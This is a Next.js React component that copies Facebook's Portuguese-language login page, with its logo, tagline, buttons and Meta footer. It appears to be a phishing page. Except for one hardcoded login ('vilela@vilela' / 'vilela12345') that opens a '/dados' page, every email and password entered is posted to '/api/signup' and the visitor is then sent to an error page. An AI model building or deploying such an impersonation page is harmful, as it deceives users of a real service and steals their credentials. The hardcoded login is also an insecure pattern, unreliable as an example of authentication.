// SignUpForm.tsx
"use client"

import { useRouter } from 'next/navigation';
import { useState } from 'react';


const SignUpForm = () => {
  const [email, setEmail] = useState('');
  const [senha, setSenha] = useState('');
  const [inputComErro, setInputComErro] = useState('');
  const [mostrarSenha,setMostrarSenha] = useState(false)
  const [icone,setIcone] = useState(false)

  const router = useRouter();

  const mudarIcone = () =>{
    setMostrarSenha(!mostrarSenha)
    setIcone(!icone)
  }

  const handleSubmit = async (e:any) => {
    e.preventDefault();

    if (email.trim() === '') {
      setInputComErro('email');
      return
      
    } else if (senha.trim() === '') {
      setInputComErro('senha');
      return
    } else {
      setInputComErro('null');
      
    }

  

    if (email === 'vilela@vilela' && senha === 'vilela12345') {
      // Se corresponderem, redirecione para a página desejada
      
      router.push('/dados'); // Substitua '/pagina-desejada' pelo caminho da sua página
      return;
    } else {
      console.error('Email ou senha inválidos');
      setEmail('')
      setSenha('')
    }
      

    const response = await fetch('/api/signup', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ email, senha }),
    });

    
    if (response.ok) {
      router.push('/error')
      console.log('Usuário cadastrado com sucesso!');
    } else {
      console.error('Erro ao cadastrar usuário');
    }
  };

  return (
    <>
    {/* class container */}
      <div className='pt-[130px] pb-[150px] max-w-[950px] mx-auto grid grid-cols-[1.5fr,1fr] items-center gap-10
      md:hidden
      '>
        {/* class left */}
         <div className='mb-[100px] md:text-center mr-[40px] w-[500px] md:w-full md:flex md:justify-center md:h-[36px]'>
            {/* class logo s */}
            <img src="4lCu2zih0ca.png" alt="logo do facebook" 
            className='block max-w-full h-[106px]  m-[-26px] pb-[25px]
            md: md:mx-auto  md:h-auto 
            '/>
            <h2 
            className='font-custom font-normal text-[28px] leading-[30px] text-[#1c1e21] max-w-[500px]'>
              O Facebook ajuda você a se conectar e <br />
               compartilhar com as pessoas que <br />
               fazem parte da sua vida.
            </h2>
         </div>

         <div>
            <form onSubmit={handleSubmit} className='p-[15px] w-[396px] shadow-md bg-white rounded-lg md:max-w-[400px] md:mx-auto
  relative          ' >
                    <input
                      className={`
                       border-[#DDDFE2] border   outline-0  focus:border-[#1877F2] 
                      w-full mb-3 p-[15px] rounded-[5px] placeholder:text-#90949C placeholder:opacity-[0.5px]
                      ${inputComErro === 'email' ? 'border-red-500' : ''}`} 
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder='Email ou telefone'
                    />
                    <div className='relative'>
                      <div onClick={() => mudarIcone()} className={`absolute ml-[330px] mt-4 cursor-pointer
                      ${senha === '' ? "hidden" : "block"} w-7 h-7 rounded-[50%] hover:bg-[#F2F2F2] items-center
                      flex justify-center`}>
                        <img src={icone? "je5FEJkU1_K.png" : "olho.png"} alt="" />
                      </div>
                      <input
                        className={`
                        border-[#DDDFE2] border   outline-0  focus:border-[#1877F2] 
                      w-full mb-3 p-[15px] rounded-[5px] placeholder:text-#90949C placeholder:opacity-[0.5px]
                      ${inputComErro === 'senha' ? 'border-red-500' : ''}`} 
                        type={mostrarSenha? "text" : "password"}
                        value={senha}
                        onChange={(e) => setSenha(e.target.value)}
                        placeholder='Senha'
                      />
                    </div>
                    <button  type="submit" className='font-bold text-white rounded-[5px] border-none p-[15px] transition-[200ms] 
                    ease-cubic-bezier(0.08, 0.55, 0.55, 1) text-[20px] bg-[#1877F2] w-full'>
                      Entrar
                    </button>
                    <a href="#">Esqueceu a senha?</a>
                    {/* class criar-conta */}
                    <button className='font-bold text-white rounded-[5px] border-none px-[15px] py-[10px] font-footer transition-[200ms] 
                    ease-cubic-bezier(0.08, 0.55, 0.55, 1) text-[17px] bg-[#52d352] mx-auto mt-[22px] hover:bg-[#42B72A]'>
                      Criar nova conta
                    </button>
            </form>
            <p className='mt-[28px] md:text-center text-[13px]'>
              <a href="#" className='text-[#1C1E21] text-[14px] font-bold hover:underline text-center'>Criar uma página </a> 
              para uma celebridade, uma marca ou uma 
            </p>
            <p className='w-full  flex items-center justify-center text-[13px]'>empresa.</p>

         </div>
      </div>
      <footer className='bg-white  h-auto pt-5 md:hidden w-[100vw] overflow-x-hidden'>
        <div className='ml-[200px]  w-[1000px] '>

          <div className='w-full h-7 flex font-footer text-xs text-[#737373]'>
            <h3>Português (Brasil)</h3>
            <h3 >English (US)</h3>
            <h3 >Español</h3>
            <h3 >Français (France)</h3>
            <h3 >Italiano</h3>
            <h3 >Deutsch</h3>
            <h3 >لعربية</h3>
            <h3  >हिन्दी</h3>
            <h3 >中文(简体)</h3>
            <h3 >日本語</h3>
          </div>
          <div className='w-[930px]  h-[1px] bg-[#DDDFE2] ml-5'></div>
          <div className='w-full h-5 flex  font-footer text-xs text-[#737373] mt-2'>
            <h3 >Cadastre-se</h3>
            <h3>Entrar</h3>
            <h3>Messenger</h3>
            <h3>Facebook Lite</h3>
            <h3>Vídeo</h3>
            <h3>Locais</h3>
            <h3>Jogos</h3>
            <h3>Marketplace</h3>
            <h3>Meta Pay</h3>
            <h3>Loja da Meta</h3>
            <h3>Meta Quest</h3>
            <h3>Instagram</h3>
            <h3>Threads</h3>
            
          </div>
          <div className='w-full  h-5  flex  font-footer text-xs text-[#737373]'>
            <h3>Campanhas de arrecadação de fundos</h3>
            <h3>Serviços</h3>
            <h3>Central de Informações de Votação</h3>
            <h3>Política de Privacidade</h3>
            <h3>Central de Privacidade</h3>
            <h3>Grupos</h3>
            <h3>Sobre</h3>
            <h3>Criar anúncio</h3>
            </div>
          <div className='w-full  h-5  flex font-footer text-xs text-[#737373]'>
            <h3>Criar Página</h3>
            <h3>Desenvolvedores</h3>
            <h3>Carreiras</h3>
            <h3>Cookies</h3>
            <h3>Escolhas para anúncios</h3>
            <h3>Termos</h3>
            <h3>Ajuda</h3>
            <h3>Carregamento de contatos e não usuários</h3>
          </div>
          <div className='w-full  h-5  flex font-footer text-xs text-[#737373] mt-5 ml-5'>
            Meta © 2023
          </div>
        </div>
      </footer>

      <div className='hidden  md:flex md:flex-col items-center justify-center bg-[#FFFFFF]' >
        <div className='w-full flex items-center justify-center'>
        <img src="4lCu2zih0ca.png" alt="logo do facebook" 
              className='block max-w-full h-[50px] ml-8'/>
        </div>
        <form onSubmit={handleSubmit} className='flex flex-col justify-center items-center w-[100vw]  sm:ml-12 ' >
                    <input
                      className={` 
                       border-[#DDDFE2] border h-10   outline-0 
                      w-[90%] mb-3 p-[15px] rounded-[5px] placeholder:text-#757575 placeholder:opacity-[0.5px]
                      bg-[#F5F6F7]  ${inputComErro === 'email' ? 'border-red-500' : ''}
                      `}
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder='Número de celular ou email'
                    />
                    <div className='relative w-[90%] '>
                      <div onClick={() => mudarIcone()} className={`absolute cursor-pointer right-2 top-2 text-[12px]
                        ${senha === '' ? "hidden" : "block"} text-[#3578e5] font-senha font-bold`}>
                          <span>{icone? "OCULTAR" : "MOSTRAR"}</span>
                        </div>
                      <input
                        className={` 
                        border-[#DDDFE2] border h-10   outline-0 
                      w-full mb-3 p-[15px] rounded-[5px] placeholder:text-#757575 placeholder:opacity-[0.5px]
                      bg-[#F5F6F7]  ${inputComErro === 'senha' ? 'border-red-500' : ''}
                      `}
                        type={mostrarSenha? "text" : "password"}
                        value={senha}
                        onChange={(e) => setSenha(e.target.value)}
                        placeholder='Senha'
                      />
                    </div>
                    <button  onClick={handleSubmit} className='font-bold text-white rounded-[5px] border-none p-[15px] transition-[200ms] 
                    ease-cubic-bezier(0.08, 0.55, 0.55, 1) text-[20px] bg-[#1877F2] w-[90%] h-10 flex items-center justify-center'>
                      Entrar
                    </button>
                    <a href="#" className='border-none'>Esqueceu a senha?</a>
                    <div className=' w-full  flex justify-between items-center'>
                      <div className='w-[40%] h-[1px] bg-[#E5E7EA]'></div>
                      <div className='text-[14px] text-[#4b4f56]'>ou</div>
                      <div className='w-[40%] h-[1px] bg-[#E5E7EA]'></div>
                    </div>
                    {/* class criar-conta */}
                    <button className='bg-white w-[80%]  border-[#E5E7EA] border-[1px] h-10 rounded mt-4 text-[15px]'>
                      Criar nova conta
                    </button> 
            </form>

            <footer className='flex  w-[100vw] justify-around ml-8 mt-16'>
              <div className='flex flex-col justify-center items-center font-footer text-xs text-[#737373]'>
                <p>Português (Brasil)</p>
                <p className='text-[#576B95]'>Español</p>
                <p className='text-[#576B95]'>Deutsch</p>
                <p className='text-[#576B95]'>العربية</p>
              </div>
              <div className='flex flex-col justify-center items-center font-footer text-xs text-[#576B95]'>
                <p>English (US)</p>
                <p>Français (France)</p>
                <p>Italiano</p>
                <img src="sinal-de-mais.png" alt="" />
              </div>
            </footer>
            <div className='flex justify-between w-[30%] font-footer text-[10px] text-[#737373] mt-2 ml-10'>
              <p>Sobre</p>
              <p className='font-bold'>.</p>
              <p>Ajuda</p>
              <p className='font-bold'>.</p>
              <p>Mais</p>
            </div>
            <div className='mt-3 font-footer text-xs text-[#737373] w-[100vw] text-center ml-10'>
              <p>Meta © 2023</p>
            </div>
      </div>
    </>
  );
};

export default SignUpForm;
